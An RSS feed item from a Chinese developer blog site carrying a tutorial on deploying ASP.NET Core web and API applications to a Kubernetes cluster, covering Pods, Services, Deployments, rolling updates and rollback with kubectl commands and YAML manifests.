<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Kubernetes初探[1]：部署你的第一个ASP.NET Core应用到k8s集群 - 雨夜朦胧</title>
<link>http://www.cnblogs.com/RainingNight/p/first-aspnetcore-app-in-k8s.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/RainingNight/p/first-aspnetcore-app-in-k8s.html</guid>
<description>&lt;h2 id=&quot;kubernetes简介&quot;&gt;Kubernetes简介&lt;/h2&gt;
&lt;p&gt;Kubernetes是Google基于Borg开源的容器编排调度引擎，作为CNCF（Cloud Native Computing Foundation）最重要的组件之一，它的目标不仅仅是一个编排系统，而是提供一个规范，可以让你来描述集群的架构，定义服务的最终状态，Kubernetes可以帮你将系统自动得达到和维持在这个状态。&lt;/p&gt;
&lt;p&gt;更直白的说，Kubernetes可以让用户通过编写一个yaml或者json格式的配置文件，也可以是通过工具/代码生成或者是直接请求Kubernetes API来创建应用，该配置文件中包含了用户想要应用程序保持的状态，不管整个Kubernetes集群中的个别主机发生什么问题，都不会影响应用程序的状态，你还可以通过改变该配置文件或请求Kubernetes API来改变应用程序的状态。&lt;/p&gt;
&lt;p&gt;这意味着开发人员不需要在意节点的数目，也不需要在意从哪里运行容器以及如何与它们交流。开发人员也不需要管理硬件优化，或担心节点关闭（它们将遵循墨菲法则），因为新的节点会添加到Kubernetes集群，同时Kubernetes会在其他运行的节点中添加容器，Kubernetes会发挥最大的作用。&lt;/p&gt;
&lt;p&gt;总结：Kubernetes是容器控制平台，可以抽象所有的底层基础设施（容器运行用到的基础设施）。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Kubernetes——让容器应用进入大规模工业生产。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Kubernetes另一个深入人心的特点是：它标准化了云服务提供商。比如，有一个Azure、Google云平台或其他云服务提供商的专家，他担任了一个搭建在全新的云服务提供商的项目。这可能引起很多后果，比如说：他可能无法在截止期限内完成；公司可能需要招聘更多相关的人员，等等。相对的，Kubernetes就没有这个问题。因为不论是哪家云服务提供商，你都可以在上面运行相同的命令，以既定的方式向Kubernetes API服务器发送请求，Kubernetes会负责抽象，并在不同的云服务商中实现。&lt;/p&gt;
&lt;p&gt;对于公司来说，这意味着他们不需要绑定到任何一家云服务商。他们可以计算其他云服务商的开销，然后转移到别家，并依旧保留着原来的专家，原来的人员，他们还可以花更少的钱。&lt;/p&gt;
&lt;h2 id=&quot;pod&quot;&gt;Pod&lt;/h2&gt;
&lt;p&gt;Kubernetes有很多技术概念，同时对应很多API对象，最重要的也是最基础的对象就是&lt;strong&gt;Pod&lt;/strong&gt;。Pod是Kubernetes集群中运行部署应用的最小单元，并且是支持多个容器的。&lt;/p&gt;
&lt;p&gt;Pod的设计理念是支持多个容器在一个Pod中共享网络地址和文件系统，可以通过进程间通信和文件共享这种简单高效的方式组合完成服务。Pod对多容器的支持是Kubernetes最基础的设计理念。比如你运行一个操作系统发行版的软件仓库，一个Nginx容器用来发布软件，另一个容器专门用来从源仓库做同步，这两个容器的镜像不太可能是一个团队开发的，但是他们一块儿工作才能提供一个微服务；这种情况下，不同的团队各自开发构建自己的容器镜像，在部署的时候组合成一个微服务对外提供服务。不过，在大多数情况下，我们只会在Pod中运行一个容器，本文中的例子也是这样的。&lt;/p&gt;
&lt;p&gt;Pod 的另一个特征是：如果我们希望使用其他 &lt;code&gt;RKE&lt;/code&gt; 等技术的话，我们可以做到不依赖Docker容器。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Docker是kubernetes中最常用的容器运行时，但是Pod也支持其他容器运行时。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;总的来说，Pod的主要特征包括：&lt;/p&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;每个Pod可以在Kubernetes集群内拥有唯一的IP地址；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;Pod可以拥有多个容器。这些容器共享同一个端口空间，所以他们可以通过&lt;code&gt;localhost&lt;/code&gt;交流（可想而知它们无法使用相同的端口），与其他Pod内容器的交流可以通过结合Pod的IP来完成；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;一个Pod内的容器共享同一个卷、同一个 IP、端口空间、IPC 命名空间。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;定义一个pod&quot;&gt;定义一个Pod&lt;/h3&gt;
&lt;p&gt;如下，我们定义一个最简单的Pod：&lt;/p&gt;
&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;apiVersion: v1
kind: Pod # 定义Kubernetes资源的类型为Pod
metadata:
  name: demo-web # 定义资源的名称
  labels: # 为Pod贴上标签，后面会介绍其用处
    app: demo-web
spec: # 定义资源的状态，对于Pod来说，最重要属性就是containers
  containers: # containers一个数组类型，如果你希望部署多个容器，可以添加多项
    - name: web # 定义本Pod中该容器的名称
      image: rainingnight/aspnetcore-web # 定义Pod启动的容器镜像地址
      ports:
        - containerPort: 80 # 定义容器监听的端口（与Dockerfile中的EXPOSE类似，只是为了提供文档信息）&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后保存，我这里命名为&lt;code&gt;demo-web-pod.yaml&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;现在我们可以在终端中输入以下命令来创建该Pod：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl create -f demo-web-pod.yaml

# 输出
# pod/demo-web created&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以使用如下命令，来查看kubernetes中的Pod列表:&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl get pods

# 输出
# NAME                           READY   STATUS    RESTARTS   AGE
# demo-web                       1/1     Running   0          65s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果该Pod还处于&lt;code&gt;ContainerCreating&lt;/code&gt;状态的话，你可以在运行命令的时候加入&lt;code&gt;--watch&lt;/code&gt;参数，这样当Pod变成运行状态的时候，会自动显示在终端中。&lt;/p&gt;
&lt;h3 id=&quot;访问应用程序&quot;&gt;访问应用程序&lt;/h3&gt;
&lt;p&gt;在上面，我们成功部署了一个ASP.NET Core Mvc程序的Pod，那么如何访问它呢？如果只是为了调试，我们可以使用转发端口的方式来快速访问：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl port-forward demo-web 8080:80

# 输出
# Forwarding from 127.0.0.1:8080 -&amp;gt; 80&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后我们再浏览器中访问：&lt;a href=&quot;http://127.0.0.1:8080&quot;&gt;127.0.0.1:8080&lt;/a&gt;，显示如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/347047/201901/347047-20190107214330232-1241209598.png&quot; alt=&quot;aspnetcore-web&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上，还展示了Pod的主机名和IP，这是因为我在应用中添加了如下代码：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public void OnGet()
{
    HostName = Dns.GetHostName();
    HostIP = Dns.GetHostEntry(HostName).AddressList.FirstOrDefault(x =&amp;gt; x.AddressFamily == AddressFamily.InterNetwork).ToString();
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;不过，端口转发的方式只能在本机访问，为了从外部访问应用程序，我们需要创建Kubernetes中的另外一种资源：&lt;strong&gt;Service&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&quot;service&quot;&gt;Service&lt;/h2&gt;
&lt;p&gt;Kubernetes中的Service资源可以作为一组提供相同服务的Pod的入口，这个资源肩负发现服务和平衡Pod之间负荷的重任。&lt;/p&gt;
&lt;p&gt;在Kubernetes集群中，我们拥有提供不同服务的Pod，那么Service如何知道该处理哪个Pod呢？&lt;/p&gt;
&lt;p&gt;这个问题就用标签来解决的，具体分两个步骤：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;给所有需要Service处理的对象Pod贴上标签。&lt;/li&gt;
&lt;li&gt;在Service中使用一个选择器（&lt;code&gt;Label Selector&lt;/code&gt;），该选择器定义了所有贴有对应的标签的对象Pod。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;标签&quot;&gt;标签&lt;/h3&gt;
&lt;p&gt;标签提供了一种简单的方法用于管理Kubernetes中的资源。它们用一对键值表示，且可以用于所有资源。&lt;/p&gt;
&lt;p&gt;其实在上面的Pod定义中，我们已经定义了标签：&lt;/p&gt;
&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;metadata:
  name: demo-web
  labels:
    app: demo-web&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上，我们为Pod附加了标签&lt;code&gt;app:demo-web&lt;/code&gt;，在查看Pod的时候，可以使用&lt;code&gt;--show-labels&lt;/code&gt;参数来显示Pod对应的标签：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl get pods --show-labels

# 输出
# NAME                           READY   STATUS    RESTARTS   AGE     LABELS
# demo-web                       1/1     Running   0          1m52s   app=demo-web&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，我们的Pod都拥有一个&lt;code&gt;app=demo-web&lt;/code&gt;标签。&lt;/p&gt;
&lt;h3 id=&quot;定义service&quot;&gt;定义Service&lt;/h3&gt;
&lt;p&gt;现在，让我们为刚才创建的Pod定义一个Service：&lt;/p&gt;
&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;apiVersion: v1
kind: Service # 定义Kubernetes资源的类型为Service
metadata:
  name: demo-web-service # 定义资源的名称
spec:
  selector: # 指定对应的Pod
    app: demo-web # 指定Pod的标签为demo-web
  ports:
  - protocol: TCP # 协议类型
    port: 80 # 指定Service访问的端口
    targetPort: 80 # 指定Service转发请求的端口
    nodePort: 30000
  type: NodePort # 指定Service的类型，在这里使用NodePort来对外访问&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上，我们使用&lt;code&gt;selector&lt;/code&gt;属性来选择相应的标签，并把服务类型（type）设置为&lt;code&gt;NodePort&lt;/code&gt;，&lt;code&gt;type&lt;/code&gt;的取值有以下4种：&lt;/p&gt;
&lt;ul readability=&quot;3.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;ClusterIP&lt;/strong&gt;：默认值，通过集群的内部IP暴露服务，该模式下，服务只能够在集群内部可以访问。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;NodePort&lt;/strong&gt;：通过每个Node上的IP和静态端口（NodePort）暴露服务，NodePort服务会路由到ClusterIP服务，这个ClusterIP服务会自动创建。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;LoadBalancer&lt;/strong&gt;：使用云提供商的负载均衡器，可以向外部暴露服务，外部的负载均衡器可以路由到NodePort服务和ClusterIP服务。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;strong&gt;ExternalName&lt;/strong&gt;：通过返回CNAME和它的值，可以将服务映射到&lt;code&gt;externalName&lt;/code&gt;字段的内容（如：foo.bar.example.com）。没有任何类型代理被创建，这只有 Kubernetes 1.7 或更高版本的kube-dns才支持。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;对于服务类型我们先了解这么多就可以了，后续会再来详细介绍。&lt;/p&gt;
&lt;p&gt;然后使用如下命令创建Service：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl create -f demo-web-service.yaml

# 输出
# service/demo-web-service created&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用如下命令来检查服务的状态：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl get services

# 输出
# NAME               TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE
# demo-web-service   NodePort    10.105.132.214   &amp;lt;none&amp;gt;        80:30000/TCP   10s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上，它有一个CLUSTER-IP为&lt;code&gt;10.105.132.214&lt;/code&gt;，因此我们可以在集群内使用&lt;code&gt;10.105.132.214:80&lt;/code&gt;来访问该服务，如果是在集群外部，可以使用&lt;code&gt;[nodeip]:30000&lt;/code&gt;来访问。&lt;/p&gt;
&lt;h3 id=&quot;服务发现与负载均衡&quot;&gt;服务发现与负载均衡&lt;/h3&gt;
&lt;p&gt;在上面我们说到，Service肩负着发现服务和平衡Pod之间负荷的重任，那它是怎么做的呢？让我们先再添加一个Pod：&lt;/p&gt;
&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;apiVersion: v1
kind: Pod
metadata:
  name: demo-web-copy
  labels:
    app: demo-web
spec:
  containers:
    - name: web
      image: rainingnight/aspnetcore-web      
      ports:
        - containerPort: 80&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上，其定义与之前的Pod一样，只是把&lt;code&gt;name&lt;/code&gt;改成了&lt;code&gt;demo-web-copy&lt;/code&gt;，然后创建Pod:&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl create -f demo-web-copy.pod.yaml

# 查看Pod
kubectl get pods

# 输出
# NAME                           READY   STATUS    RESTARTS   AGE
# demo-web                       1/1     Running   0          10m
# demo-web-copy                  1/1     Running   0          29s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在我们使用&lt;code&gt;NodeIP:3000&lt;/code&gt;来访问，打开两个浏览器窗口，多刷新几次，以便让它们分别路由到不同的Node，最终显示如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/347047/201901/347047-20190107214347366-207593079.png&quot; alt=&quot;aspnetcore-web-service&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，我们新创建的Pod已经通过Servie来接受请求了，不需要修改成任何程序代码，Kubernetes就已经帮我们实现了服务发现和负载均衡，是不是非常爽。&lt;/p&gt;
&lt;h2 id=&quot;deployment&quot;&gt;Deployment&lt;/h2&gt;
&lt;p&gt;在上面我们手动部署了两个Pod，但是这只是单机的玩法，它与直接使用Docker容器相比并无太大优势，如果我们需要部署一千个实例，那就是一个痛苦的过程，或者我们又想快速更新和迅速回滚，这根本就是不可能的！&lt;/p&gt;
&lt;p&gt;其实在k8s中，我们很少直接使用Pod，更多的是使用Kubernetes的另外一种资源：&lt;strong&gt;Deployment&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;Deployment表示用户对Kubernetes集群的一次更新操作。可以是创建一个新的服务或是更新一个新的服务，也可以是滚动升级一个服务。Deployment可以帮助每一个应用程序的生命都保持相同的一点：那就是变化。此外，只有挂掉的应用程序才会一尘不变，否则，新的需求会源源不断地涌现，更多代码会被开发出来、打包以及部署，这个过程中的每一步都有可能出错。Deployment可以自动化应用程序从一版本升迁到另一版本的过程，并保证服务不间断，如果有意外发生，它可以让我们迅速回滚到前一个版本。&lt;/p&gt;
&lt;h3 id=&quot;deployment定义&quot;&gt;Deployment定义&lt;/h3&gt;
&lt;p&gt;现在，我们使用Deployment来部署我们的Pod，并实现在部署期间服务不间断服务，可以如下定义：&lt;/p&gt;
&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;apiVersion: apps/v1
kind: Deployment # 定义Kubernetes资源的类型为Deployment
metadata:
  name: demo-web-deployment # 定义资源的名称
  labels:
    app: demo-web-deployment
spec:  # 定义资源的状态。
  replicas: 2 # 定义我们想运行多少个Pod，在这里我们希望运行2个
  selector:
    matchLabels: # 定义该部署匹配哪些Pod
      app: demo-web
  minReadySeconds: 5 # 可选，指定Pod可以变成可用状态的最小秒数，默认是0
  strategy: # 指定更新版本时，部署使用的策略
    type: RollingUpdate # 策略类型，使用RollingUpdate可以保证部署期间服务不间断
    rollingUpdate:
      maxUnavailable: 1 # 部署时最大允许停止的Pod数量（与replicas相比）
      maxSurge: 1 # 部署时最大允许创建的Pod数量（与replicas相比）
  template: # 用来指定Pod的模板，与Pod的定义类似
    metadata:
      labels: # 根据模板创建的Pod会被贴上该标签，与上面的matchLabels对应
        app: demo-web
    spec:
      containers:
        - name: web
          image: rainingnight/aspnetcore-web
          imagePullPolicy: Always # 默认是IfNotPresent，如果设置成Always，则每一次部署都会重新拉取容器映像（否则，如果本地存在指定的镜像版本，就不会再去拉取）
          ports:
            - containerPort: 80&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;保存为&lt;code&gt;demo-web-deployment.yaml&lt;/code&gt;，然后输入以下命令来创建Deployment：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl create -f demo-web-deployment.yaml

# 输出
# deployment.apps/demo-web-deployent created&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在我们再来查看以下Pod:&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl get pods

# 输出
# NAME                                   READY   STATUS    RESTARTS   AGE
# demo-web                               1/1     Running   0          4h28m
# demo-web-copy                          1/1     Running   0          18m
# demo-web-deployment-745f7997c4-d24bb   1/1     Running   0          16s
# demo-web-deployment-745f7997c4-jk9jn   1/1     Running   0          16s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上，我们有4个运行中的Pod，其中前二个是我们手动创建的，其他两个是使用Deployment创建的。&lt;/p&gt;
&lt;p&gt;我们可以使用&lt;code&gt;kubectl delete pod &amp;lt;pod-name&amp;gt;&lt;/code&gt;删除一个Deployment创建的Pod，看看结果会怎样：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl delete pod demo-web-deployment-745f7997c4-d24bb

# 输出
# pod &quot;demo-web-deployment-745f7997c4-d24bb&quot; deleted&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;再次查看Pod列表：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl get pods

# 输出
# NAME                                   READY   STATUS    RESTARTS   AGE
# demo-web                               1/1     Running   0          31m
# demo-web-copy                          1/1     Running   0          22m
# demo-web-deployment-745f7997c4-jk9jn   1/1     Running   0          3m39s
# demo-web-deployment-745f7997c4-mrrw6   1/1     Running   0          11s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，又重新创建了一个Pod：&lt;code&gt;demo-web-deployment-745f7997c4-mrrw6&lt;/code&gt;，Deployment会监控我们的Pod数量，保持为我们预期的个数。&lt;/p&gt;
&lt;h3 id=&quot;零停机时间部署zero-downtime&quot;&gt;零停机时间部署(Zero-downtime)&lt;/h3&gt;
&lt;p&gt;现在我们尝试以下零停机部署，首先修改Deployment中的&lt;code&gt;image&lt;/code&gt;为：&lt;code&gt;rainingnight/aspnetcore-web:1.0.0&lt;/code&gt;，然后运行如下命令：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl apply -f demo-web-deployment.yaml --record

# 输出
# deployment.apps/demo-web-deployment configured&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将kubectl的&lt;code&gt;--record&lt;/code&gt;设置为&lt;code&gt;true&lt;/code&gt;可以在&lt;code&gt;annotation&lt;/code&gt;中记录当前命令创建或者升级了该资源。这在未来会很有用，例如，查看在每个 Deployment revision 中执行了哪些命令。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;除了修改yaml外，还可以直接运行&lt;code&gt;kubectl set image deployment demo-web-deployment web=rainingnight/aspnetcore-web:1.0.0 --record&lt;/code&gt;来达到同样的效果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后使用如下命令检查服务更新状态：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl rollout status deployment demo-web-deployment

# 输出
# Waiting for deployment &quot;demo-web-deployment&quot; rollout to finish: 1 old replicas are pending termination...
# Waiting for deployment &quot;demo-web-deployment&quot; rollout to finish: 1 old replicas are pending termination...
# Waiting for deployment &quot;demo-web-deployment&quot; rollout to finish: 1 old replicas are pending termination...
# Waiting for deployment &quot;demo-web-deployment&quot; rollout to finish: 1 old replicas are pending termination...
# Waiting for deployment &quot;demo-web-deployment&quot; rollout to finish: 1 of 2 updated replicas are available...
# Waiting for deployment &quot;demo-web-deployment&quot; rollout to finish: 1 of 2 updated replicas are available...
# deployment &quot;demo-web-deployment&quot; successfully rolled out&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上可以看到，新版本已经成功上线，并在这个过程中副本被逐个替换，也就意味着应用程序始终在线。&lt;/p&gt;
&lt;p&gt;现在我们刷新一下浏览器，可以看到标题已经变成了&lt;code&gt;Home page - Web-v1&lt;/code&gt;:&lt;/p&gt;
&lt;h3 id=&quot;回滚到前一个状态&quot;&gt;回滚到前一个状态&lt;/h3&gt;
&lt;p&gt;如果突然发现新上线的版本有Bug，需要紧急回滚到上一个版本，那对Kubernetes来说也是非常简单的。&lt;/p&gt;
&lt;p&gt;我们首先运行如下命令来查看历史版本：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl rollout history deployment demo-web-deployment

# 输出
# deployment.extensions/demo-web-deployment 
# REVISION  CHANGE-CAUSE
# 1         &amp;lt;none&amp;gt;
# 2         kubectl apply --filename=demo-web-deployment.yaml --record=true&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上，可以看到有2条历史，那么为什么第1条的&lt;code&gt;CHANGE-CAUSE&lt;/code&gt;是&lt;code&gt;&amp;lt;none&amp;gt;&lt;/code&gt;呢，这就是因为我们第二次部署的时候使用了&lt;code&gt;--record=true&lt;/code&gt;参数。现在，我们想回滚到第一个版本，只需运行如下命令：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl rollout undo deployment demo-web-deployment --to-revision=1

# 输出
# deployment.extensions/demo-web-deployment rolled back&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;再次刷新浏览器，标题又变回了&lt;code&gt;Home page - Web&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;部署多个应用&quot;&gt;部署多个应用&lt;/h2&gt;
&lt;p&gt;现在我们再部署一个ASP.NET Core WebApi程序，并在刚才的Web应用中调用它，形成一个最简单的微服务模式。&lt;/p&gt;
&lt;h3 id=&quot;部署webapi&quot;&gt;部署WebApi&lt;/h3&gt;
&lt;p&gt;与前面的Web应用的部署类似，就不用过多介绍，定义如下YAML:&lt;/p&gt;
&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;apiVersion: apps/v1
kind: Deployment
metadata:
  name: demo-api-deployment
  labels:
    app: demo-api-deployment
spec:
  replicas: 2
  selector:
    matchLabels:
      app: demo-api
  minReadySeconds: 5
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
      maxSurge: 1
  template:
    metadata:
      labels:
        app: demo-api
    spec:
      containers:
        - name: api
          image: rainingnight/aspnetcore-api
          imagePullPolicy: Always
          ports:
            - containerPort: 80&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后创建Deployment：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl create -f demo-api-deployment.yaml &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查看部署情况：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl get pods

# 输出
# NAME                                   READY   STATUS    RESTARTS   AGE
# demo-api-deployment-66575d644-9wk7g    1/1     Running   0          75s
# demo-api-deployment-66575d644-fknpx    1/1     Running   0          75s
# demo-web-deployment-745f7997c4-h7fr8   1/1     Running   0          9m23s
# demo-web-deployment-745f7997c4-kvptm   1/1     Running   0          9m23s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;前面手动创建的2个Pod已经被我删除了，因为用Deployment创建的Pod就好了。&lt;/p&gt;
&lt;p&gt;现在我们为Api应用也创建一个Service，以便在Web应用中访问它：&lt;/p&gt;
&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;apiVersion: v1
kind: Service
metadata:
  name: demo-api-service
spec:
  selector:
    app: demo-api
  ports:
  - protocol: TCP
    port: 80
    targetPort: 80&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;因为我们的Api应用是不需要在集群外部访问的，因此服务类型（type）不需要设置，使用默认的&lt;code&gt;ClusterIP&lt;/code&gt;就可以了。&lt;/p&gt;
&lt;p&gt;部署Servcie:&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl create -f demo-api-service.yaml&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后查看Servie:&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl get services

# 输出
# NAME               TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE
# demo-api-service   ClusterIP   10.111.25.49     &amp;lt;none&amp;gt;        80/TCP         26s
# demo-web-service   NodePort    10.105.132.214   &amp;lt;none&amp;gt;        80:30000/TCP   58m&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以使用浏览器来访问：&lt;a href=&quot;http://10.111.25.49/api/values&quot;&gt;10.111.25.49/api/values&lt;/a&gt; 来验证一下是否部署成功。&lt;/p&gt;
&lt;h3 id=&quot;调用服务&quot;&gt;调用服务&lt;/h3&gt;
&lt;p&gt;那么，还剩下最后一个问题，我们的Web应用中如何获取到Api应用的访问地址呢？&lt;/p&gt;
&lt;p&gt;我们先看一下，在Web应用的代码中是怎么调用Api的：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;// Startup.cs
public void ConfigureServices(IServiceCollection services)
{
    services.AddHttpClient(&quot;api&quot;, _ =&amp;gt; _.BaseAddress = new Uri(Configuration[&quot;ApiBaseUrl&quot;]));
}

// FetchData.cshtml
public class FetchDataModel : PageModel
{
    private static HttpClient _client;

    public FetchDataModel(IHttpClientFactory httpClientFactory)
    {
        _client = httpClientFactory.CreateClient(&quot;api&quot;);
    }

    public IList&amp;lt;WeatherForecast&amp;gt; Forecasts { get; set; }

    public async Task OnGetAsync()
    {
        var res = await _client.GetStringAsync(&quot;/api/SampleData/WeatherForecasts&quot;);
        Forecasts = JsonConvert.DeserializeObject&amp;lt;IList&amp;lt;WeatherForecast&amp;gt;&amp;gt;(res);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如上，我们首先注册了一个&lt;code&gt;HttpClient&lt;/code&gt;，并从配置文件中读取&lt;code&gt;ApiBaseUrl&lt;/code&gt;做为&lt;code&gt;BaseAddress&lt;/code&gt;，然后在&lt;code&gt;FetchData&lt;/code&gt;页面中使用&lt;code&gt;HttpClient&lt;/code&gt;调用Api服务。&lt;/p&gt;
&lt;p&gt;因为在Asp.Net Core中，默认情况下，环境变量中的配置是会覆盖&lt;code&gt;appsettings.json&lt;/code&gt;中的配置的，因此我们可以使用添加环境变量的方式来配置&lt;code&gt;ApiBaseUrl&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;修改&lt;code&gt;demo-web-deployment.yaml&lt;/code&gt;，添加&lt;code&gt;env&lt;/code&gt;属性，如下：&lt;/p&gt;
&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;containers:
  - name: web
    image: rainingnight/aspnetcore-web
    imagePullPolicy: Always
    ports:
      - containerPort: 80
    env:
      - name: ApiBaseUrl
        value: &quot;http://10.111.25.49&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后在Kubernetes中应用该配置：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;kubectl apply -f demo-web-deployment.yaml &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;等待滚动更新完成，刷新浏览器，点击&lt;code&gt;FetchData&lt;/code&gt;菜单：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/347047/201901/347047-20190107214403329-811324752.png&quot; alt=&quot;aspnetcore-web-fetchdata&quot;/&gt;&lt;/p&gt;
